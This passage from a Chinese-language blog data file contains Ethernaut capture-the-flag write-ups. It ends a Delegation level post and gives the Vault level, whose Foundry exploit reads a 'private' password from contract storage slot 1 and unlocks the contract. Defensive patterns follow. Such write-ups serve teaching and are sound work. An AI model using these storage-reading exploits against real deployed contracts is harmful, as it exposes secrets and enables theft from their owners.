安全：匹配的存储布局</span><br><span class=\"line\">contract ProxyV2 &#123;</span><br><span class=\"line\">    address public owner;    // 槽 0</span><br><span class=\"line\">    uint256 public value;    // 槽 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV2 &#123;</span><br><span class=\"line\">    address public owner;    // 槽 0 ← 匹配</span><br><span class=\"line\">    uint256 public value;    // 槽 1 ← 匹配</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-函数选择器计算\"><a href=\"#3-函数选择器计算\" class=\"headerlink\" title=\"3. 函数选择器计算\"></a>3. 函数选择器计算</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateSelector() public pure returns (bytes4) &#123;</span><br><span class=\"line\">    // 方法 1：直接计算</span><br><span class=\"line\">    bytes4 selector1 = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 方法 2：使用 abi.encodeWithSignature</span><br><span class=\"line\">    bytes memory data = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">    bytes4 selector2 = bytes4(data);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 方法 3：使用 this.functionName.selector</span><br><span class=\"line\">    // bytes4 selector3 = this.pwn.selector; // 如果函数存在</span><br><span class=\"line\">    </span><br><span class=\"line\">    return selector1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-实际应用场景\"><a href=\"#🏛️-实际应用场景\" class=\"headerlink\" title=\"🏛️ 实际应用场景\"></a>🏛️ 实际应用场景</h2><h3 id=\"代理模式的正确使用\"><a href=\"#代理模式的正确使用\" class=\"headerlink\" title=\"代理模式的正确使用\"></a>代理模式的正确使用</h3><ol>\n<li><p><strong>升级模式</strong>：</p>\n<ul>\n<li>UUPS (Universal Upgradeable Proxy Standard)</li>\n<li>Transparent Proxy Pattern</li>\n<li>Beacon Proxy Pattern</li>\n</ul>\n</li>\n<li><p><strong>钻石模式</strong> (EIP-2535)：</p>\n<ul>\n<li>多面切割合约</li>\n<li>功能模块化</li>\n</ul>\n</li>\n<li><p><strong>最小代理</strong> (EIP-1167)：</p>\n<ul>\n<li>Clone Factory Pattern</li>\n<li>节省部署成本</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Delegation 关卡揭示了 <code>delegatecall</code> 的双刃剑特性：</p>\n<ul>\n<li>✅ <strong>理解上下文切换机制</strong> - 代码在不同存储空间执行</li>\n<li>✅ <strong>掌握存储槽布局匹配</strong> - 代理和实现必须一致</li>\n<li>✅ <strong>学习安全代理模式</strong> - 使用标准化解决方案</li>\n<li>✅ <strong>认识函数选择器安全</strong> - 控制可调用的函数</li>\n</ul>\n<p><code>delegatecall</code> 是实现合约升级和模块化的重要工具，但也是许多安全漏洞的根源。理解其工作原理对于构建安全的可升级合约至关重要。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">上一关: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">下一关: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/4.x/api/proxy\">OpenZeppelin 代理文档</a></strong></li>\n<li><strong><a href=\"https://eips.ethereum.org/EIPS/eip-1967\">EIP-1967: Standard Proxy Storage Slots</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>在智能合约的世界中，上下文就是一切。</em> 🔄</p>\n"},{"title":"Ethernaut Level 8: Vault - 私有变量读取","date":"2025-01-25T07:30:00.000Z","updated":"2025-01-25T07:30:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入学习区块链存储机制和私有变量读取攻击，掌握 Vault 关卡的攻击技术和防护措施。理解 EVM 存储布局和 eth_getStorageAt 的使用。","_content":"\n# 🎯 Ethernaut Level 8: Vault - 私有变量读取\n\n> **关卡链接**: [Ethernaut Level 8 - Vault](https://ethernaut.openzeppelin.com/level/8)  \n> **攻击类型**: 私有变量读取  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n要 unlock 这个合约账户，也就是要找到 password。挑战的关键在于理解区块链上没有真正的\"私有\"数据，所有状态变量都可以被读取。\n\n![Vault Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg)\n\n## 🔍 漏洞分析\n\n### 存储机制 (Storage)\n\n我们需要理解 EVM 中存储的布局以及原理（使用 32 字节大小的插槽）和 JSON RPC 函数 `eth_getStorageAt`。\n\nEVM 的数据都存在 32 字节槽中：\n- 第一个状态变量存储在槽位 0\n- 如果第一个变量存储完了还有足够的字节，下一个变量也存储在 slot 0\n- 否则存储在 slot 1，依此类推\n\n> **注意**: 像数组和字符串这样的动态类型工作方式不同\n\n在 Vault 合约中：\n- `locked` 是一个布尔值，使用 1 字节，存储在 slot 0\n- `password` 是一个 bytes32，使用 32 个字节\n- 由于插槽 0 中剩余的 31 个字节无法容纳 password，因此它被存储在 slot 1 中\n\n### 读取 Storage\n\n`eth_getStorageAt` JSON RPC 函数可用于读取合约在给定槽位的存储。\n\n使用 web3.js 读取 slot 1 的合约存储：\n\n```javascript\nweb3.eth.getStorageAt(contractAddress, 1, (err, result) => {\n  console.log(result);\n});\n```\n\n在 Foundry 中，可以使用 cheatcodes 中的 load：\n\n```solidity\nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n```\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/VaultFactory.sol\";\n\ncontract VaultTest is Test {\n    Ethernaut ethernaut;\n    VaultFactory vaultFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        vaultFactory = new VaultFactory();\n        ethernaut.registerLevel(vaultFactory);\n    }\n    \n    function testVaultExploit() public {\n        // 创建关卡实例\n        address levelInstance = ethernaut.createLevelInstance(vaultFactory);\n        Vault instance = Vault(levelInstance);\n        \n        // 验证初始状态\n        assertEq(instance.locked(), true);\n        \n        // 攻击：读取存储在 slot 1 中的密码\n        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n        \n        // 使用读取的密码解锁\n        instance.unlock(password);\n        \n        // 验证攻击成功\n        assertEq(instance.locked(), false);\n        \n        // 提交关卡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **分析存储布局**：确定 password 存储在 slot 1\n2. **读取存储**：使用 `vm.load()` 读取 slot 1 的数据\n3. **调用 unlock**：使用读取的密码解锁合约\n\n```solidity\n// 读取 slot 1 中的密码\nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n\n// 解锁合约\ninstance.unlock(password);\n\n// 验证解锁成功\nassertEq(instance.locked(), false);\n```\n\n## 🛡️ 防御措施\n\n### 1. 避免在链上存储敏感数据\n\n```solidity\n// ❌ 不安全：密码存储在链上\ncontract VulnerableVault {\n    bytes32 private password;  // 可以被读取！\n    \n    constructor(bytes32 _password) {\n        password = _password;\n    }\n}\n\n// ✅ 安全：使用哈希验证\ncontract SecureVault {\n    bytes32 private passwordHash;  // 存储哈希而不是明文\n    \n    constructor(bytes32 _passwordHash) {\n        passwordHash = _passwordHash;\n    }\n    \n    function unlock(string memory _password) public {\n        require(keccak256(abi.encodePacked(_password)) == passwordHash, \"Wrong password\");\n        // unlock logic\n    }\n}\n```\n\n### 2. 使用提交-揭示方案\n\n```solidity\ncontract CommitRevealVault {\n    mapping(address => bytes32) private commitments;\n    \n    // 第一阶段：提交哈希\n    function commit(bytes32 _commitment) public {\n        commitments[msg.sender] = _commitment;\n    }\n    \n    // 第二阶段：揭示并验证\n    function reveal(string memory _password, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        // unlock logic\n    }\n}\n```\n\n### 3. 使用链下验证\n\n```solidity\ncontract OffChainVault {\n    address private authorizedSigner;\n    mapping(address => bool) private unlocked;\n    \n    function unlock(bytes memory signature, address user) public {\n        bytes32 messageHash = keccak256(abi.encodePacked(user, \"unlock\"));\n        address signer = recoverSigner(messageHash, signature);\n        require(signer == authorizedSigner, \"Unauthorized\");\n        unlocked[user] = true;\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### 存储读取工具\n\n```bash\n# 使用 cast 读取存储\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# 使用 web3.py\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\npassword = w3.eth.get_storage_at(contract_address, 1)\n```\n\n### 存储布局分析\n\n```solidity\n// 使用 forge inspect 查看存储布局\n// forge inspect <CONTRACT> storage-layout\n```\n\n## 🎯 总结\n\n**核心概念**:\n- `private` 关键字意味着数据只能由合约本身访问，而不是对外界隐藏\n- 区块链上没有什么是私有的，一切都是公开的，任何人都可以阅读\n- EVM 存储使用 32 字节的插槽系统\n\n**攻击向量**:\n- 直接读取合约存储\n- 分析存储布局确定敏感数据位置\n- 使用 RPC 调用或 Foundry cheatcodes 读取数据\n\n**防御策略**:\n- 永远不要在链上存储明文敏感数据\n- 使用哈希和承诺方案\n- 考虑链下验证机制\n- 实施适当的访问控制\n\n---\n\n## 🔗 相关链接\n\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[上一关: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[下一关: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","source":"_posts/ethernaut-level-08-vault.md","raw":"---\ntitle: 'Ethernaut Level 8: Vault - 私有变量读取'\ndate: 2025-01-25 15:30:00\nupdated: 2025-01-25 15:30:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - 私有变量读取\n  - 智能合约安全\n  - Solidity\n  - Storage\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入学习区块链存储机制和私有变量读取攻击，掌握 Vault 关卡的攻击技术和防护措施。理解 EVM 存储布局和 eth_getStorageAt 的使用。\"\n---\n\n# 🎯 Ethernaut Level 8: Vault - 私有变量读取\n\n> **关卡链接**: [Ethernaut Level 8 - Vault](https://ethernaut.openzeppelin.com/level/8)  \n> **攻击类型**: 私有变量读取  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n要 unlock 这个合约账户，也就是要找到 password。挑战的关键在于理解区块链上没有真正的\"私有\"数据，所有状态变量都可以被读取。\n\n![Vault Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg)\n\n## 🔍 漏洞分析\n\n### 存储机制 (Storage)\n\n我们需要理解 EVM 中存储的布局以及原理（使用 32 字节大小的插槽）和 JSON RPC 函数 `eth_getStorageAt`。\n\nEVM 的数据都存在 32 字节槽中：\n- 第一个状态变量存储在槽位 0\n- 如果第一个变量存储完了还有足够的字节，下一个变量也存储在 slot 0\n- 否则存储在 slot 1，依此类推\n\n> **注意**: 像数组和字符串这样的动态类型工作方式不同\n\n在 Vault 合约中：\n- `locked` 是一个布尔值，使用 1 字节，存储在 slot 0\n- `password` 是一个 bytes32，使用 32 个字节\n- 由于插槽 0 中剩余的 31 个字节无法容纳 password，因此它被存储在 slot 1 中\n\n### 读取 Storage\n\n`eth_getStorageAt` JSON RPC 函数可用于读取合约在给定槽位的存储。\n\n使用 web3.js 读取 slot 1 的合约存储：\n\n```javascript\nweb3.eth.getStorageAt(contractAddress, 1, (err, result) => {\n  console.log(result);\n});\n```\n\n在 Foundry 中，可以使用 cheatcodes 中的 load：\n\n```solidity\nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n```\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/VaultFactory.sol\";\n\ncontract VaultTest is Test {\n    Ethernaut ethernaut;\n    VaultFactory vaultFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        vaultFactory = new VaultFactory();\n        ethernaut.registerLevel(vaultFactory);\n    }\n    \n    function testVaultExploit() public {\n        // 创建关卡实例\n        address levelInstance = ethernaut.createLevelInstance(vaultFactory);\n        Vault instance = Vault(levelInstance);\n        \n        // 验证初始状态\n        assertEq(instance.locked(), true);\n        \n        // 攻击：读取存储在 slot 1 中的密码\n        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n        \n        // 使用读取的密码解锁\n        instance.unlock(password);\n        \n        // 验证攻击成功\n        assertEq(instance.locked(), false);\n        \n        // 提交关卡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **分析存储布局**：确定 password 存储在 slot 1\n2. **读取存储**：使用 `vm.load()` 读取 slot 1 的数据\n3. **调用 unlock**：使用读取的密码解锁合约\n\n```solidity\n// 读取 slot 1 中的密码\nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n\n// 解锁合约\ninstance.unlock(password);\n\n// 验证解锁成功\nassertEq(instance.locked(), false);\n```\n\n## 🛡️ 防御措施\n\n### 1. 避免在链上存储敏感数据\n\n```solidity\n// ❌ 不安全：密码存储在链上\ncontract VulnerableVault {\n    bytes32 private password;  // 可以被读取！\n    \n    constructor(bytes32 _password) {\n        password = _password;\n    }\n}\n\n// ✅ 安全：使用哈希验证\ncontract SecureVault {\n    bytes32 private passwordHash;  // 存储哈希而不是明文\n    \n    constructor(bytes32 _passwordHash) {\n        passwordHash = _passwordHash;\n    }\n    \n    function unlock(string memory _password) public {\n        require(keccak256(abi.encodePacked(_password)) == passwordHash, \"Wrong password\");\n        // unlock logic\n    }\n}\n```\n\n### 2. 使用提交-揭示方案\n\n```solidity\ncontract CommitRevealVault {\n    mapping(address => bytes32) private commitments;\n    \n    // 第一阶段：提交哈希\n    function commit(bytes32 _commitment) public {\n        commitments[msg.sender] = _commitment;\n    }\n    \n    // 第二阶段：揭示并验证\n    function reveal(string memory _password, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        // unlock logic\n    }\n}\n```\n\n### 3. 使用链下验证\n\n```solidity\ncontract OffChainVault {\n    address private authorizedSigner;\n    mapping(address => bool) private unlocked;\n    \n    function unlock(bytes memory signature, address user) public {\n        bytes32 messageHash = keccak256(abi.encodePacked(user, \"unlock\"));\n        address signer = recoverSigner(messageHash, signature);\n        require(signer == authorizedSigner, \"Unauthorized\");\n        unlocked[user] = true;\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### 存储读取工具\n\n```bash\n# 使用 cast 读取存储\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# 使用 web3.py\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\npassword = w3.eth.get_storage_at(contract_address, 1)\n```\n\n### 存储布局分析\n\n```solidity\n// 使用 forge inspect 查看存储布局\n// forge inspect <CONTRACT> storage-layout\n```\n\n## 🎯 总结\n\n**核心概念**:\n- `private` 关键字意味着数据只能由合约本身访问，而不是对外界隐藏\n- 区块链上没有什么是私有的，一切都是公开的，任何人都可以阅读\n- EVM 存储使用 32 字节的插槽系统\n\n**攻击向量**:\n- 直接读取合约存储\n- 分析存储布局确定敏感数据位置\n- 使用 RPC 调用或 Foundry cheatcodes 读取数据\n\n**防御策略**:\n- 永远不要在链上存储明文敏感数据\n- 使用哈希和承诺方案\n- 考虑链下验证机制\n- 实施适当的访问控制\n\n---\n\n## 🔗 相关链接\n\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[上一关: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[下一关: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","slug":"ethernaut-level-08-vault","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp5000pbf5qcp9lgy5y","content":"<h1 id=\"🎯-Ethernaut-Level-8-Vault-私有变量读取\"><a href=\"#🎯-Ethernaut-Level-8-Vault-私有变量读取\" class=\"headerlink\" title=\"🎯 Ethernaut Level 8: Vault - 私有变量读取\"></a>🎯 Ethernaut Level 8: Vault - 私有变量读取</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/8\">Ethernaut Level 8 - Vault</a><br><strong>攻击类型</strong>: 私有变量读取<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>要 unlock 这个合约账户，也就是要找到 password。挑战的关键在于理解区块链上没有真正的”私有”数据，所有状态变量都可以被读取。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg\" alt=\"Vault Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"存储机制-Storage\"><a href=\"#存储机制-Storage\" class=\"headerlink\" title=\"存储机制 (Storage)\"></a>存储机制 (Storage)</h3><p>我们需要理解 EVM 中存储的布局以及原理（使用 32 字节大小的插槽）和 JSON RPC 函数 <code>eth_getStorageAt</code>。</p>\n<p>EVM 的数据都存在 32 字节槽中：</p>\n<ul>\n<li>第一个状态变量存储在槽位 0</li>\n<li>如果第一个变量存储完了还有足够的字节，下一个变量也存储在 slot 0</li>\n<li>否则存储在 slot 1，依此类推</li>\n</ul>\n<blockquote>\n<p><strong>注意</strong>: 像数组和字符串这样的动态类型工作方式不同</p>\n</blockquote>\n<p>在 Vault 合约中：</p>\n<ul>\n<li><code>locked</code> 是一个布尔值，使用 1 字节，存储在 slot 0</li>\n<li><code>password</code> 是一个 bytes32，使用 32 个字节</li>\n<li>由于插槽 0 中剩余的 31 个字节无法容纳 password，因此它被存储在 slot 1 中</li>\n</ul>\n<h3 id=\"读取-Storage\"><a href=\"#读取-Storage\" class=\"headerlink\" title=\"读取 Storage\"></a>读取 Storage</h3><p><code>eth_getStorageAt</code> JSON RPC 函数可用于读取合约在给定槽位的存储。</p>\n<p>使用 web3.js 读取 slot 1 的合约存储：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddress, <span class=\"number\">1</span>, <span class=\"function\">(<span class=\"params\">err, result</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(result);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>在 Foundry 中，可以使用 cheatcodes 中的 load：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/VaultFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract VaultTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    VaultFactory vaultFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        vaultFactory = new VaultFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(vaultFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testVaultExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(vaultFactory);</span><br><span class=\"line\">        Vault instance = Vault(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证初始状态</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击：读取存储在 slot 1 中的密码</span><br><span class=\"line\">        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 使用读取的密码解锁</span><br><span class=\"line\">        instance.unlock(password);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交关卡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>分析存储布局</strong>：确定 password 存储在 slot 1</li>\n<li><strong>读取存储</strong>：使用 <code>vm.load()</code> 读取 slot 1 的数据</li>\n<li><strong>调用 unlock</strong>：使用读取的密码解锁合约</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 读取 slot 1 中的密码</span><br><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\"></span><br><span class=\"line\">// 解锁合约</span><br><span class=\"line\">instance.unlock(password);</span><br><span class=\"line\"></span><br><span class=\"line\">// 验证解锁成功</span><br><span class=\"line\">assertEq(instance.locked(), false);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-避免在链上存储敏感数据\"><a href=\"#1-避免在链上存储敏感数据\" class=\"headerlink\" title=\"1. 避免在链上存储敏感数据\"></a>1. 避免在链上存储敏感数据</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：密码存储在链上</span><br><span class=\"line\">contract VulnerableVault &#123;</span><br><span class=\"line\">    bytes32 private password;  // 可以被读取！</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _password) &#123;</span><br><span class=\"line\">        password = _password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：使用哈希验证</span><br><span class=\"line\">contract SecureVault &#123;</span><br><span class=\"line\">    bytes32 private passwordHash;  // 存储哈希而不是明文</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _passwordHash) &#123;</span><br><span class=\"line\">        passwordHash = _passwordHash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(string memory _password) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_password)) == passwordHash, &quot;Wrong password&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用提交-揭示方案\"><a href=\"#2-使用提交-揭示方案\" class=\"headerlink\" title=\"2. 使用提交-揭示方案\"></a>2. 使用提交-揭示方案</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealVault &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第一阶段：提交哈希</span><br><span class=\"line\">    function commit(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _commitment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第二阶段：揭示并验证</span><br><span class=\"line\">    function reveal(string memory _password, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-使用链下验证\"><a href=\"#3-使用链下验证\" class=\"headerlink\" title=\"3. 使用链下验证\"></a>3. 使用链下验证</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td 